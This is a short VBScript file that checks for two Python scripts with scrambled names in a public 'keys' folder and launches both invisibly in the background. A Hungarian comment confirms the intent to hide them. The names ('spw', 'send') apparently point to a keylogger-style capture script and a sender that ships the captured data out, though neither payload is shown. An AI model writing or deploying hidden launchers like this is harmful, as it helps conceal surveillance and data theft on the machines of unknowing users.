Option Explicit

Dim shell, baseDir, spwPath, sendPath, fso
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

baseDir = "C:\Users\Public\Documents\keys"

spwPath = baseDir & "\spwww743g7w.py"
sendPath = baseDir & "\fwsendbfgw.py"

If Not fso.FileExists(spwPath) Then
    MsgBox "spw.py not found: " & spwPath
    WScript.Quit
End If

If Not fso.FileExists(sendPath) Then
    MsgBox "send.py not found: " & sendPath
    WScript.Quit
End If

' Láthatatlan háttérben futtatás
shell.Run "cmd /c start """" /B py """ & spwPath & """", 0, False
shell.Run "cmd /c start """" /B py """ & sendPath & """", 0, False
